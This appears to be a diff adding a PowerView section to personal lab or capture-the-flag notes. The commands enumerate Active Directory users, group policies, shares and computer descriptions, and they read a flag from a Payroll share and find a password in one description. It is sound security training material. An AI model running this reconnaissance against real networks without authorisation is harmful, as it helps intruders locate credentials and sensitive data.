@@ -824,51 +824,57 @@ end
 
 ## PowerView
 
-*Command:*
-
-*Result:* 
-
----
-
-*Command:*
-
-*Result:* 
+*Command:* Load powerview
+- . .\PowerView.ps1
+  
+*Result:* PowerView cmds can be used
 
 ---
 
-*Command:*
+*Command:* Use Conversion table: 
+- Get-ADDomain | fl Name,DomainMode
 
-*Result:* 
-
----
-
-*Command:*
-
-*Result:* 
+*Result:* 5 = Windows 2012
 
 ---
 
-*Command:*
+*Command:* Get-DomainUser -Identity rachel.flemmings
 
-*Result:* 
-
----
-
-*Command:*
-
-*Result:* 
+*Result:* SID
 
 ---
 
-*Command:*
+*Command:* Get-DomainGpo -ComputerName NUM2-MS01| Select-Object displayname
 
-*Result:* 
+*Result:* Disable Defender
 
 ---
 
-*Command:*
+*Command:* List shares
+- Get-NetShare -ComputerName ENUM2-MS01
 
-*Result:* 
+*Result:* Foundshare Payroll
+
+---
+
+*Command:* Connect to share + access file
+- net use x : "\\ENUM2-MS01\Payroll"
+- pushd \\ENUM2-MS01\Payroll
+- type share.txt
+  
+*Result:* Flag
+
+---
+
+*Command:* Get-DomainComputer | Select-Object name,description | Where {$_.description -ne $null}
+
+*Result:* Password
+
+---
+
+*Command:* Get-DomainGroup -Identity "Citrix AdminS"
+
+*Result:* Name of the manager
 
 ---
 
